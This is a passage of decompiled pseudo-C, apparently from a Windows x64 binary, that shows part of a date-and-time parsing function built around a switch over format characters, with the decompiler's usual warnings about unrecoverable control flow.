_auStack440);\n            auStack456 = CONCAT48(uStack400, CONCAT44(uStack404, uStack408));\n            auStack456_00 = CONCAT412(uStack396, auStack456);\n            fcn.14005bd60(&piStack424, arg2, auStack440, &stack0xfffffffffffffe38);\n            piVar28 = uStack416;\n            uStack392 = SUB84(piStack424, 0);\n            uStack388 = piStack424 >> 0x20;\n            uStack384 = uStack416;\n            piVar21 = piStack424;\n            piVar27 = piVar30;\n            uVar37 = uStack368;\n            if (uStack368 == 0) {\n                piVar28 = uStack416;\n                *in_stack_00000048 = *in_stack_00000048 | 0x480;\n                in_stack_00000048[1] = uStack364;\n            }\n            break;\n        case 0x1f:\n            arg3 = &pcStack360;\n            fcn.140025a80(arg1_01, 0x1400fe58e, 0x1400fe597, arg3);\n            auStack440 = CONCAT44(uStack388, uStack392);\n            _auStack440 = CONCAT48(uStack384, auStack440);\n            _auStack440 = CONCAT412(uStack380, _auStack440);\n            auStack456 = CONCAT48(uStack400, CONCAT44(uStack404, uStack408));\n            auStack456_00 = CONCAT412(uStack396, auStack456);\n            goto code_r0x00014005e133;\n        case 0x23:\n            in_stack_fffffffffffffe00 = &uStack368;\n            in_stack_fffffffffffffde8 = CONCAT44(uVar35, 0x17);\n            auStack440 = CONCAT44(uStack388, uStack392);\n            _auStack440 = CONCAT48(uStack384, auStack440);\n            _auStack440 = CONCAT412(uStack380, _auStack440);\n            auStack456 = CONCAT48(uStack400, CONCAT44(uStack404, uStack408));\n            auStack456_00 = CONCAT412(uStack396, auStack456);\n            fcn.14005bd60(&piStack424, arg2, auStack440, &stack0xfffffffffffffe38);\n            piVar28 = uStack416;\n            uStack392 = SUB84(piStack424, 0);\n            uStack388 = piStack424 >> 0x20;\n            uStack384 = uStack416;\n            piVar21 = piStack424;\n            piVar27 = piVar30;\n            uVar37 = uStack368;\n            if (uStack368 == 0) {\n                piVar28 = uStack416;\n                in_stack_00000038[2] = uStack364;\n                *in_stack_00000048 = *in_stack_00000048 & 0xfe;\n            }\n            break;\n        case 0x24:\n            in_stack_fffffffffffffe00 = &uStack368;\n            in_stack_fffffffffffffde8 = CONCAT44(uVar35, 0xc);\n            _auStack440 = CONCAT412(uStack380, CONCAT48(uStack384, CONCAT44(uStack388, uStack392)));\n            auStack456 = CONCAT48(uStack400, CONCAT44(uStack404, uStack408));\n            auStack456_00 = CONCAT412(uStack396, auStack456);\n            fcn.14005bd60(&piStack424, arg2, auStack440, &stack0xfffffffffffffe38);\n            piVar28 = uStack416;\n            uStack392 = SUB84(piStack424, 0);\n            uStack388 = piStack424 >> 0x20;\n            uStack384 = uStack416;\n            piVar21 = piStack424;\n            piVar27 = piVar30;\n            uVar37 = uStack368;\n            if (uStack368 == 0) {\n                piVar28 = uStack416;\n                in_stack_00000038[2] = uStack364 % 0xc;\n                *in_stack_00000048 = *in_stack_00000048 | 1;\n            }\n            break;\n        case 0x28:\n            in_stack_fffffffffffffe00 = &uStack368;\n            in_stack_fffffffffffffde8 = CONCAT44(uVar35, 0x3b);\n            auStack440 = CONCAT44(uStack388, uStack392);\n            _auStack440 = CONCAT48(uStack384, auStack440);\n            _auStack440 = CONCAT412(uStack380, _auStack440);\n            auStack456 = CONCAT48(uStack400, CONCAT44(uStack404, uStack408));\n            auStack456_00 = CONCAT412(uStack396, auStack456);\n            fcn.14005bd60(&piStack424, arg2, auStack440, &stack0xfffffffffffffe38);\n            piVar28 = uStack416;\n            uStack392 = SUB84(piStack424, 0);\n            uStack388 = piStack424 >> 0x20;\n            uStack384 = uStack416;\n            piVar21 = piStack424;\n            piVar27 = piVar30;\n            uVar37 = uStack368;\n            if (uStack368 == 0) {\n                piVar28 = uStack416;\n                in_stack_00000038[1] = uStack364;\n            }\n            break;\n        case 0x2d:\n            arg3 = &pcStack360;\n            fcn.140025a80(arg1_01, 0x1400fe597, 0x1400fe59d, arg3);\n            _auStack440 = CONCAT412(uStack380, CONCAT48(uStack384, CONCAT44(uStack388, uStack392)));\n            auStack456 = CONCAT48(uStack400, CONCAT44(uStack404, uStack408));\n            auStack456_00 = CONCAT412(uStack396, auStack456);\n            goto code_r0x00014005dbb5;\n        case 0x2e:\n            in_stack_fffffffffffffe00 = &uStack368;\n            in_stack_fffffffffffffde8 = CONCAT44(uVar35, 0x3c);\n            auStack440 = CONCAT44(uStack388, uStack392);\n            _auStack440 = CONCAT48(uStack384, auStack440);\n            _auStack440 = CONCAT412(uStack380, _auStack440);\n            auStack456 = CONCAT48(uStack400, CONCAT44(uStack404, uStack408));\n            auStack456_00 = CONCAT412(uStack396, auStack456);\n            fcn.14005bd60(&piStack424, arg2, auStack440, &stack0xfffffffffffffe38);\n            piVar28 = uStack416;\n            uStack392 = SUB84(piStack424, 0);\n            uStack388 = piStack424 >> 0x20;\n            uStack384 = uStack416;\n            piVar21 = piStack424;\n            piVar27 = piVar30;\n            uVar37 = uStack368;\n            if (uStack368 == 0) {\n                piVar28 = uStack416;\n                *in_stack_00000038 = uStack364;\n            }\n            break;\n        case 0x2f:\n            arg3 = &pcStack360;\n            fcn.140025a80(arg1_01, 0x1400fe59d, 0x1400fe5a6, arg3);\n            auStack456_00 = CONCAT412(uStack396, CONCAT48(uStack400, CONCAT44(uStack404, uStack408)));\n            auStack440 = CONCAT44(uStack388, uStack392);\n            _auStack440 = CONCAT48(uStack384, auStack440);\n            _auStack440 = CONCAT412(uStack380, _auStack440);\n            goto code_r0x00014005dbb5;\n        case 0x30:\n            in_stack_fffffffffffffe00 = &uStack368;\n            in_stack_fffffffffffffde8 = CONCAT44(uVar35, 0x35);\n            auStack440 = CONCAT44(uStack388, uStack392);\n            _auStack440 = CONCAT48(uStack384, auStack440);\n            _auStack440 = CONCAT412(uStack380, _auStack440);\n            auStack456 = CONCAT48(uStack400, CONCAT44(uStack404, uStack408));\n            auStack456_00 = CONCAT412(uStack396, auStack456);\n            fcn.14005bd60(&piStack424, arg2, auStack440, &stack0xfffffffffffffe38);\n            piVar28 = uStack416;\n            uStack392 = SUB84(piStack424, 0);\n            uStack388 = piStack424 >> 0x20;\n            uStack384 = uStack416;\n            piVar21 = piStack424;\n            piVar27 = piVar30;\n            uVar37 = uStack368;\n            if (uStack368 == 0) {\n                uVar37 = *in_stack_00000048;\n                in_stack_fffffffffffffe34 = uVar37;\n                in_stack_fffffffffffffe35 = uVar37 >> 8;\n                in_stack_fffffffffffffe36 = uVar37 >> 0x10;\n                in_stack_fffffffffffffe37 = uVar37 >> 0x18;\n                uVar25 = (uStack364 & 0x3f) << 0x10 | 0x20;\n                uVar37 = uVar37 & 0xffc0ffdf;\ncode_r0x00014005e7bb:\n                *in_stack_00000048 = uVar25 | uVar37;\n                piVar21 = piStack424;\n                piVar27 = piVar30;\n                uVar37 = uStack368;\n                uStack384 = uStack416;\n            }\n            break;\n        case 0x32:\n            in_stack_fffffffffffffe00 = &uStack368;\n            in_stack_fffffffffffffde8 = CONCAT44(uVar35, 0x35);\n            _auStack440 = CONCAT412(uStack380, CONCAT48(uStack384, CONCAT44(uStack388, uStack392)));\n            auStack456 = CONCAT48(uStack400, CONCAT44(uStack404, uStack408));\n            auStack456_00 = CONCAT412(uStack396, auStack456);\n            fcn.14005bd60(&piStack424, arg2, auStack440, &stack0xfffffffffffffe38);\n            piVar28 = uStack416;\n            uStack392 = SUB84(piStack424, 0);\n            uStack388 = piStack424 >> 0x20;\n            uStack384 = uStack416;\n            piVar21 = piStack424;\n            piVar27 = piVar30;\n            uVar37 = uStack368;\n            if (uStack368 == 0) {\n                uVar37 = *in_stack_00000048;\n                in_stack_fffffffffffffe34 = uVar37;\n                in_stack_fffffffffffffe35 = uVar37 >> 8;\n                in_stack_fffffffffffffe36 = uVar37 >> 0x10;\n                in_stack_fffffffffffffe37 = uVar37 >> 0x18;\n                uVar25 = (uStack364 & 0x3f) << 0x10 | 0x40;\n                uVar37 = uVar37 & 0xffc0ffbf;\n                goto code_r0x00014005e7bb;\n            }\n            break;\n        case 0x33:\n            auStack456_00 = CONCAT412(uStack396, CONCAT48(uStack400, CONCAT44(uStack404, uStack408)));\n            auStack440 = CONCAT44(uStack388, uStack392);\n            _auStack440 = CONCAT48(uStack384, auStack440);\n            _auStack440 = CONCAT412(uStack380, _auStack440);\n            goto code_r0x00014005dbb5;\n        case 0x34:\n            in_stack_fffffffffffffe00 = &uStack368;\n            in_stack_fffffffffffffde8 = CONCAT44(uVar35, 9999);\n            auStack440 = CONCAT44(uStack388, uStack392);\n            _auStack440 = CONCAT48(uStack384, auStack440);\n            _auStack440 = CONCAT412(uStack380, _auStack440);\n            auStack456 = CONCAT48(uStack400, CONCAT44(uStack404, uStack408));\n            auStack456_00 = CONCAT412(uStack396, auStack456);\n            fcn.14005bd60(&piStack424, arg2, auStack440, &stack0xfffffffffffffe38);\n            piVar28 = uStack416;\n            uStack392 = SUB84(piStack424, 0);\n            uStack388 = piStack424 >> 0x20;\n            uStack384 = uStack416;\n            piVar21 = piStack424;\n            piVar27 = piVar30;\n            uVar37 = uStack368;\n            if (uStack368 == 0) {\n                piVar28 = uStack416;\n                in_stack_00000038[5] = uStack364 - 0x76c;\n                in_stack_fffffffffffffe34 = *(in_stack_00000048 + 1);\n                *(in_stack_00000048 + 1) = in_stack_fffffffffffffe34 & 0xf9 | 4;\n            }\n            break;\n        case 0x35:\n            uVar24 = fcn.140023fd0(&uStack392);\n            if ((*(arg1_01[6] + uVar24 * 2) & 1) == 0) goto code_r0x00014005e1ec;\n            puVar34 = &uStack368;\n            arg3 = &pcStack360;\n            in_stack_fffffffffffffde8 = 0xe;\n            arg_70h = &stack0xfffffffffffffe38;\n            auStack456_00 = CONCAT412(uStack396, CONCAT48(uStack400, CONCAT44(uStack404, uStack408)));\n            auStack440 = CONCAT44(uStack388, uStack392);\n            _auStack440 = CONCAT48(uStack384, auStack440);\n            _auStack440 = CONCAT412(uStack380, _auStack440);\n            fcn.14005c340(&piStack424, arg2, auStack440, arg_70h, arg3, *0x140102ce0, 0xe, in_stack_00000028, puVar34, \n                          in_stack_fffffffffffffe00, in_stack_fffffffffffffe08, noname_11, arg_70h, pcVar36, iVar13, \n                          CONCAT17(in_stack_fffffffffffffe37, \n                                   CONCAT16(in_stack_fffffffffffffe36, \n                                            CONCAT15(in_stack_fffffffffffffe35, \n                                                     CONCAT14(in_stack_fffffffffffffe34, uVar37)))), \n                          CONCAT44(uStack404, uStack408));\n            uStack392 = SUB84(piStack424, 0);\n            uStack388 = piStack424 >> 0x20;\n            uStack384 = uStack416;\n            cVar7 = fcn.140023f10(&uStack392, &uStack408);\n            uVar37 = uStack368;\n            if ((cVar7 == '\\0') && ((uStack368 | pcStack360) == 0)) {\n                cVar7 = fcn.140023fd0(&uStack392);\n                if (*(arg1_01 + 7) == '\\0') {\n                    cVar8 = fcn.140025b10(arg1_01, 0x2d);\n                }\n                else {\n                    cVar8 = *(arg1_01 + 0x66);\n                }\n                arg4 = arg_70h;\n                if (cVar7 != cVar8) {\n                    cVar7 = fcn.140023fd0(&uStack392);\n                    if (*(arg1_01 + 7) == '\\0') {\n                        cVar8 = fcn.140025b10(arg1_01, 0x2b);\n                    }\n                    else {\n                        cVar8 = *(arg1_01 + 100);\n                    }\n                    arg4 = arg_70h;\n                    if (cVar7 != cVar8) goto code_r0x00014005da2c;\n                }\n                uVar35 = in_stack_fffffffffffffde8 >> 0x20;\n                auStack440 = CONCAT44(uStack388, uStack392);\n                _auStack440 = CONCAT48(uStack384, auStack440);\n                _auStack440 = CONCAT412(uStack380, _auStack440);\n                arg_70h = arg4;\n                fcn.14005bd60(&piStack424, arg2, auStack440, arg4);\n                in_stack_fffffffffffffde8 = CONCAT44(uVar35, 0x3b);\n                uStack384 = uStack416;\n                uStack392 = SUB84(piStack424, 0);\n                uStack388 = piStack424 >> 0x20;\n                auStack456 = CONCAT48(uStack400, CONCAT44(uStack404, uStack408));\n                auStack456_00 = CONCAT412(uStack396, auStack456);\n                _auStack440 = CONCAT48(uStack416, piStack424);\n                _auStack440 = CONCAT412(uStack380, _auStack440);\n                fcn.14005bd60(&piStack424, arg2, auStack440, arg4);\n                uStack384 = uStack416;\n                uStack392 = SUB84(piStack424, 0);\n                uStack388 = piStack424 >> 0x20;\n                in_stack_fffffffffffffe00 = puVar34;\n                uVar37 = uStack368;\n            }\n            goto code_r0x00014005da2c;\n        case 0x3e:\n            _auStack440 = CONCAT412(uStack380, CONCAT48(uStack384, CONCAT44(uStack388, uStack392)));\n            auStack456 = CONCAT48(uStack400, CONCAT44(uStack404, uStack408));\n            auStack456_00 = CONCAT412(uStack396, auStack456);\ncode_r0x00014005e133:\n            in_stack_fffffffffffffde8 = in_stack_00000038;\n            fcn.14005cf50(&piStack424, arg2);\n            piVar28 = uStack416;\n            uStack392 = SUB84(piStack424, 0);\n            uStack388 = piStack424 >> 0x20;\n            uStack384 = uStack416;\n            piVar21 = piStack424;\n            piVar27 = piVar30;\n            uVar37 = uStack368;\n            if (uStack368 == 0) {\n                piVar28 = uStack416;\n                *(in_stack_00000048 + 1) = *(in_stack_00000048 + 1) | 4;\n            }\n            break;\n        case 0x3f:\n        case 0x40:\n            uVar24 = fcn.140023fd0(&uStack392);\n            uVar35 = in_stack_fffffffffffffde8 >> 0x20;\n            if ((*(arg1_01[6] + uVar24 * 2) & 0x20) != 0) {\n                fcn.140095670(CONCAT44(uStack388, uStack392));\n                uStack384 = 0xffffffff;\n            }\n            in_stack_fffffffffffffe00 = &uStack368;\n            in_stack_fffffffffffffde8 = CONCAT44(uVar35, 0x1f);\n            auStack456_00 = CONCAT412(uStack396, CONCAT48(uStack400, CONCAT44(uStack404, uStack408)));\n            auStack440 = CONCAT44(uStack388, uStack392);\n            _auStack440 = CONCAT48(uStack384, auStack440);\n            _auStack440 = CONCAT412(uStack380, _auStack440);\n            fcn.14005bd60(&piStack424, arg2, auStack440, &stack0xfffffffffffffe38);\n            piVar28 = uStack416;\n            uStack392 = SUB84(piStack424, 0);\n            uStack388 = piStack424 >> 0x20;\n            uStack384 = uStack416;\n            piVar21 = piStack424;\n            piVar27 = piVar30;\n            uVar37 = uStack368;\n            if (uStack368 == 0) {\n                piVar28 = uStack416;\n                in_stack_00000038[3] = uStack364;\n                *in_stack_00000048 = *in_stack_00000048 | 0x410;\n            }\n            break;\n        case 0x45:\n            in_stack_fffffffffffffe00 = &uStack368;\n            in_stack_fffffffffffffde8 = CONCAT44(uVar35, 0x16e);\n            auStack440 = CONCAT44(uStack388, uStack392);\n            _auStack440 = CONCAT48(uStack384, auStack440);\n            _auStack440 = CONCAT412(uStack380, _auStack440);\n            auStack456 = CONCAT48(uStack400, CONCAT44(uStack404, uStack408));\n            auStack456_00 = CONCAT412(uStack396, auStack456);\n            fcn.14005bd60(&piStack424, arg2, auStack440, &stack0xfffffffffffffe38);\n            piVar28 = uStack416;\n            uStack392 = SUB84(piStack424, 0);\n            uStack388 = piStack424 >> 0x20;\n            uStack384 = uStack416;\n            piVar21 = piStack424;\n            piVar27 = piVar30;\n            uVar37 = uStack368;\n            if (uStack368 == 0) {\n                piVar28 = uStack416;\n                in_stack_00000038[7] = uStack364 - 1;\n                *in_stack_00000048 = *in_stack_00000048 | 4;\n            }\n            break;\n        case 0x48:\n            in_stack_fffffffffffffe00 = &uStack368;\n            in_stack_fffffffffffffde8 = CONCAT44(uVar35, 0xc);\n            auStack456_00 = CONCAT412(uStack396, CONCAT48(uStack400, CONCAT44(uStack404, uStack408)));\n            auStack440 = CONCAT44(uStack388, uStack392);\n            _auStack440 = CONCAT48(uStack384, auStack440);\n            _auStack440 = CONCAT412(uStack380, _auStack440);\n            fcn.14005bd60(&piStack424, arg2, auStack440, &stack0xfffffffffffffe38);\n            piVar28 = uStack416;\n            uStack392 = SUB84(piStack424, 0);\n            uStack388 = piStack424 >> 0x20;\n            uStack384 = uStack416;\n            piVar21 = piStack424;\n            piVar27 = piVar30;\n            uVar37 = uStack368;\n            if (uStack368 == 0) {\n                piVar28 = uStack416;\n                in_stack_00000038[4] = uStack364 - 1;\n                *in_stack_00000048 = *in_stack_00000048 | 8;\n            }\n            break;\n        case 0x49:\n        case 0x4f:\n            while ((cVar7 = fcn.140023f10(&uStack392, &uStack408),  cVar7 == '\\0' &&\n                   (uVar24 = fcn.140023fd0(&uStack392),  (*(arg1_01[6] + uVar24 * 2) & 0x20) != 0))) {\n                fcn.140095670(CONCAT44(uStack388, uStack392));\n                uStack384 = 0xffffffff;\n            }\ncode_r0x00014005da2c:\n            piVar28 = uStack384;\n            arg_70h = arg_70h & 0xffffffff00000000 | uStack400;\n            piVar21 = CONCAT44(uStack388, uStack392);\n            piVar27 = piVar30;\n            break;\n        case 0x4b:\n            pcStack360 = *(*(iVar13 + 0x10) + 0x40);\n            pcStack352 = *(*(iVar13 + 0x10) + 0x48);\n            if ((*pcStack360 == '\\0') || (*pcStack352 == '\\0')) {\n                piVar21 = CONCAT44(uStack388, uStack392);\n                piVar27 = piVar30;\n            }\n            else {\n                in_stack_fffffffffffffde8 = 0x2;\n                auStack440 = CONCAT44(uStack388, uStack392);\n                _auStack440 = CONCAT48(uStack384, auStack440);\n                _auStack440 = CONCAT412(uStack380, _auStack440);\n                auStack456 = CONCAT48(uStack400, CONCAT44(uStack404, uStack408));\n                auStack456_00 = CONCAT412(uStack396, auStack456);\n                fcn.14005c340(&piStack424, arg2, auStack440, &stack0xfffffffffffffe38, &uStack364, &pcStack360, 2, \n                              in_stack_00000028, &uStack368, in_stack_fffffffffffffe00, in_stack_fffffffffffffe08, \n                              noname_11, arg_70h, pcVar36, iVar13, \n                              CONCAT17(in_stack_fffffffffffffe37, \n                                       CONCAT16(in_stack_fffffffffffffe36, \n                                                CONCAT15(in_stack_fffffffffffffe35, \n                                                         CONCAT14(in_stack_fffffffffffffe34, uVar37)))), \n                              CONCAT44(uStack404, uStack408));\n                uStack384 = uStack416;\n                piVar28 = uStack416;\n                uStack392 = SUB84(piStack424, 0);\n                uStack388 = piStack424 >> 0x20;\n                piVar21 = piStack424;\n                piVar27 = piVar30;\n                uVar37 = uStack368;\n                if ((uStack368 == 0) && (uStack364 != 0)) {\n                    piVar28 = uStack416;\n                    *(in_stack_00000048 + 1) = *(in_stack_00000048 + 1) | 1;\n                }\n            }\n            break;\n        case 0x4d:\n            auStack440 = CONCAT44(uStack388, uStack392);\n            _auStack440 = CONCAT48(uStack384, auStack440);\n            _auStack440 = CONCAT412(uStack380, _auStack440);\n            auStack456 = CONCAT48(uStack400, CONCAT44(uStack404, uStack408));\n            auStack456_00 = CONCAT412(uStack396, auStack456);\n            goto code_r0x00014005dbb5;\n        case 0x52:\n            in_stack_fffffffffffffe00 = &uStack368;\n            in_stack_fffffffffffffde8 = CONCAT44(uVar35, 6);\n            auStack440 = CONCAT44(uStack388, uStack392);\n            _auStack440 = CONCAT48(uStack384, auStack440);\n            _auStack440 = CONCAT412(uStack380, _auStack440);\n            auStack456 = CONCAT48(uStack400, CONCAT44(uStack404, uStack408));\n            auStack456_00 = CONCAT412(uStack396, auStack456);\n            fcn.14005bd60(&piStack424, arg2, auStack440, &stack0xfffffffffffffe38);\n            piVar28 = uStack416;\n            uStack392 = SUB84(piStack424, 0);\n            uStack388 = piStack424 >> 0x20;\n            uStack384 = uStack416;\n            piVar21 = piStack424;\n            piVar27 = piVar30;\n            uVar37 = uStack368;\n            if (uStack368 == 0) {\n                piVar28 = uStack416;\n                in_stack_00000038[6] = uStack364;\n                *in_stack_00000048 = *in_stack_00000048 | 2;\n            }\n            break;\n        case 0x53:\n            auStack440 = CONCAT44(uStack388, uStack392);\n            _auStack440 = CONCAT48(uStack384, auStack440);\n            _auStack440 = CONCAT412(uStack380, _auStack440);\n            auStack456 = CONCAT48(uStack400, CONCAT44(uStack404, uStack408));\n            auStack456_00 = CONCAT412(uStack396, auStack456);\ncode_r0x00014005dbb5:\n            in_stack_fffffffffffffde8 = in_stack_00000038;\n            fcn.14005cf50(&piStack424, arg2);\n            uStack384 = uStack416;\n            uStack392 = SUB84(piStack424, 0);\n            uStack388 = piStack424 >> 0x20;\n            piVar28 = uStack416;\n            piVar21 = piStack424;\n            piVar27 = piVar30;\n            uVar37 = uStack368;\n            break;\n        case 0x54:\n            in_stack_fffffffffffffe00 = &uStack368;\n            in_stack_fffffffffffffde8 = CONCAT44(uVar35, 99);\n            auStack440 = CONCAT44(uStack388, uStack392);\n            _auStack440 = CONCAT48(uStack384, auStack440);\n            _auStack440 = CONCAT412(uStack380, _auStack440);\n            auStack456 = CONCAT48(uStack400, CONCAT44(uStack404, uStack408));\n            auStack456_00 = CONCAT412(uStack396, auStack456);\n            fcn.14005bd60(&piStack424, arg2, auStack440, &stack0xfffffffffffffe38);\n            piVar28 = uStack416;\n            uStack392 = SUB84(piStack424, 0);\n            uStack388 = piStack424 >> 0x20;\n            uStack384 = uStack416;\n            piVar21 = piStack424;\n            piVar27 = piVar30;\n            uVar37 = uStack368;\n            if (uStack368 == 0) {\n                *(in_stack_00000048 + 1) = *(in_stack_00000048 + 1) | 6;\n                cVar7 = fcn.140023f10(&uStack392, &uStack408);\n                uVar25 = uStack364;\n                uVar35 = arg_70h >> 0x20;\n                if (cVar7 == '\\0') {\n                    cVar7 = fcn.140023fd0(&uStack392);\n                    cVar7 = fcn.140025b60(arg1_01, cVar7, 0x2a);\n                    if (9 < cVar7 - 0x30U) goto code_r0x00014005ebf7;\n                    fcn.140095670(CONCAT44(uStack388, uStack392));\n                    uStack384 = 0xffffffff;\n                    uVar25 = (cVar7 - 0x30U) + uVar25 * 10;\n                    uStack364 = uVar25;\n                    cVar7 = fcn.140023f10(&uStack392, &uStack408);\n                    if (cVar7 == '\\0') {\n                        cVar7 = fcn.140023fd0(&uStack392);\n                        cVar7 = fcn.140025b60(arg1_01, cVar7, 0x2a);\n                        if (cVar7 - 0x30U < 10) {\n                            fcn.140095670(CONCAT44(uStack388, uStack392));\n                            uStack384 = 0xffffffff;\n                            uVar25 = uVar25 * 10 + (cVar7 - 0x30U);\n                        }\n                    }\n                    arg3 = uVar25 - 0x76c;\n                    *(in_stack_00000048 + 1) = *(in_stack_00000048 + 1) & 0xfd;\n                }\n                else {\ncode_r0x00014005ebf7:\n                    arg3 = uVar25;\n                    if (uVar25 < 0x45) {\n                        arg3 = uVar25 + 100;\n                    }\n                }\n                piVar28 = uStack384;\n                in_stack_00000038[5] = arg3;\n                arg_70h = CONCAT44(uVar35, uStack400);\n                piVar21 = CONCAT44(uStack388, uStack392);\n            }\n            break;\n        case 0x55:\n            *0x1400fe5a7 = *0x1400fe5a7 + -1 + (0xfffffffebff01a57 < uVar15);\n            *(uVar15 + 0x1400fe533) = *(uVar15 + 0x1400fe533) + -1;\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x56:\n            *auStack280._0_8_ = *auStack280._0_8_ + auStack280._0_8_;\n            goto code_r0x000140066815;\n        case 0x57:\n            goto code_r0x0001400667c3;\n        case 0x58:\n            _auStack440 = auVar33;\n            piStack312 = piVar22;\n            fcn.1400b36a0(piVar21);\n            iVar13 = fcn.1400261c0(0x1400fb400);\n            ppcVar1 = *(*(auStack280._0_8_ + 0xd0) + 0x18) + iVar13 * 8;\n            UNRECOVERED_JUMPTABLE = *ppcVar1;\n            if (UNRECOVERED_JUMPTABLE == NULL) {\n                puVar20 = fcn.1400b6520(0x70);\n                *(puVar20 + 1) = 0;\n                *puVar20 = 0x14010b650;\n                puVar20[2] = 0;\n                puVar20[3] = 0;\n                *(puVar20 + 4) = 0;\n                *(puVar20 + 0x21) = 0;\n                puVar20[5] = 0;\n                puVar20[6] = 0;\n                puVar20[7] = 0;\n                puVar20[8] = 0;\n                puVar20[9] = 0;\n                puVar20[10] = 0;\n                *(puVar20 + 0xb) = 0;\n                *(puVar20 + 0x5c) = 0;\n                *(puVar20 + 0x6f) = 0;\n                fcn.14009a5d0(puVar20, piVar21);\n                fcn.14009d930(*(auStack280._0_8_ + 0xd0), puVar20, iVar13);\n                UNRECOVERED_JUMPTABLE = *ppcVar1;\n            }\ncode_r0x0001400667c3:\n            in_stack_fffffffffffffde8 = &uStack400;\n            uVar18 = fcn.140075910(0, 0);\n            uStack408 = uVar18;\n            uStack404 = uVar18 >> 0x20;\n            if (UNRECOVERED_JUMPTABLE[0x20] != 0x0) {\n                fcn.140077810(&uStack408, 0x20);\n            }\ncode_r0x000140066815:\n            uVar18 = fcn.140075910(0, 0);\n            uStack400 = uVar18;\n            uStack396 = uVar18 >> 0x20;\n            fcn.140077810(in_stack_fffffffffffffde8, 0x20);\n            cVar8 = '\\0';\n            iVar13 = 0;\n            uStack412 = *(UNRECOVERED_JUMPTABLE + 0x60);\n            cVar7 = '\\0';\n            cVar38 = '\\0';\n            do {\n                if (*(&uStack412 + iVar13) < 5) {\n    // WARNING: Could not recover jumptable at 0x0001400668b5. Too many branches\n    // WARNING: Treating indirect jump as call\n                    piVar21 = (*(*(*(&uStack412 + iVar13) * 4 + 0x1400fe6fc) + 0x1400fe6fc))();\n                    return piVar21;\n                }\n                iVar11 = iVar13;\n                iVar13 = iVar13 + 1;\n            } while (iVar11 + 1 < 4);\n            puVar34 = in_stack_fffffffffffffde8;\n            if (1 < *(CONCAT44(uStack396, uStack400) + -0x18)) {\n                cVar38 = '\\0';\n                cVar8 = '\\0';\n                cVar7 = '\\0';\n                uVar16 = fcn.14001ef10(in_stack_fffffffffffffde8, 0x30, 0);\n                if (uVar16 != 0) {\n                    uVar15 = *(CONCAT44(uStack396, uStack400) + -0x18);\n                    if (uVar16 == 0xffffffffffffffff) {\n                        uVar16 = uVar15 - 1;\n                    }\n                    if (uVar16 <= uVar15) {\n                        uVar15 = uVar16;\n                    }\n                    fcn.140077920(in_stack_fffffffffffffde8, 0, uVar15, 0);\n                }\n            }\n            if (cVar38 != '\\0') {\n                pcVar19 = CONCAT44(uStack396, uStack400);\n                if (-1 < *(pcVar19 + -8)) {\n                    fcn.1400758a0(puVar34);\n                    pcVar19 = CONCAT44(uStack396, uStack400);\n                }\n                if (*pcVar19 != '0') {\n                    if (-1 < *(pcVar19 + -8)) {\n                        fcn.1400758a0(puVar34);\n                    }\n                    fcn.140075d80(puVar34, 0, 0, 1);\n                    *(CONCAT44(uStack396, uStack400) + -8) = 0xffffffff;\n                }\n            }\n            if (*(CONCAT44(uStack404, uStack408) + -0x18) != 0) {\n                cVar38 = '\\0';\n                if (cVar8 != '\\0') {\n                    cVar38 = cVar7;\n                }\n                fcn.140077ac0(&uStack408, cVar38);\n                cVar7 = fcn.1400b15c0(*(UNRECOVERED_JUMPTABLE + 0x10), *(UNRECOVERED_JUMPTABLE + 0x18), &uStack408);\n                if (cVar7 == '\\0') {\n                    *auStack280._8_8_ = *auStack280._8_8_ | 4;\n                }\n            }\n            if ((cVar8 == '\\0') || (*(UNRECOVERED_JUMPTABLE + 0x58) == 0)) {\n                fcn.1400762a0(CONCAT44(uStack260, uStack264), puVar34);\n            }\n            else {\n                *auStack280._8_8_ = *auStack280._8_8_ | 4;\n            }\n            cVar7 = fcn.140023f10(auStack440, &stack0xfffffffffffffe38);\n            if (cVar7 != '\\0') {\n                *auStack280._8_8_ = *auStack280._8_8_ | 2;\n            }\n            *piStack312 = auStack440._0_4_;\n            *(piStack312 + 4) = auStack440._4_4_;\n            *(piStack312 + 1) = uStack432;\n            *(piStack312 + 0xc) = uStack428;\n            fcn.140075fa0(CONCAT44(uStack396, uStack400) + -0x18);\n            fcn.140075fa0(CONCAT44(uStack404, uStack408) + -0x18);\n            return piStack312;\n        case 0x59:\n            *auStack280._0_8_ = *auStack280._0_8_;\n            *(uVar15 + 0x1400fe535) = *(uVar15 + 0x1400fe535) + uVar23;\n            *(uVar15 + 0x1400fe531) = *(uVar15 + 0x1400fe531) + uVar23;\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x5a:\n            cVar7 = auStack280._0_8_ >> 8;\n            do {\n                piVar30 = piVar28;\n                if ((cVar7 != '\\0') && (piVar30 = NULL,  piVar27[3] <= piVar27[2])) {\n                    iVar11 = (**(*piVar27 + 0x48))(piVar27);\n                    piVar30 = iVar11 == -1;\n                    if (iVar11 == -1) {\n                        _auStack440 = _auStack440 & 0xffffffffffffffff;\n                    }\n                }\n                do {\n                    uVar24 = piVar21;\n                    piVar21 = SUB168(auStack456_00, 0);\n                    bVar31 = iStack448 == -1;\n                    if (((piVar21 != NULL) && (bVar31)) && (bVar31 = false,  piVar21[3] <= piVar21[2])) {\n                        iVar11 = (**(*piVar21 + 0x48))();\n                        bVar31 = iVar11 == -1;\n                        if (bVar31) {\n                            auStack456_00 = auStack456_00 & 0xffffffffffffffff;\n                        }\n                    }\n                    piVar26 = aiStackY584;\n                    if (piVar30 == bVar31) goto code_r0x000140065920;\n                    if ((auStack440 == NULL) || (piVar28 == '\\0')) {\ncode_r0x000140065ee2:\n                        piVar26 = aiStackY584;\n                        if ((*(noname_11[6] + uVar24 * 2) & 0x20) == 0) goto code_r0x000140065920;\n                        puVar14 = auStack440[2];\n                        if (puVar14 < auStack440[3]) goto code_r0x000140065f0f;\n                        (**(*auStack440 + 0x50))(auStack440);\n                        piVar27 = auStack440;\n                    }\n                    else {\n                        puVar14 = auStack440[2];\n                        if (auStack440[3] <= puVar14) {\n                            iVar11 = (**(*auStack440 + 0x48))(auStack440);\n                            uVar24 = iVar11;\n                            if (iVar11 == -1) {\n                                _auStack440 = _auStack440 & 0xffffffffffffffff;\n                            }\n                            goto code_r0x000140065ee2;\n                        }\n                        piVar26 = aiStackY584;\n                        if ((*(noname_11[6] + *puVar14 * 2) & 0x20) == 0) goto code_r0x000140065920;\ncode_r0x000140065f0f:\n                        auStack440[2] = puVar14 + 1;\n                        piVar27 = auStack440;\n                    }\n                    _auStack440 = 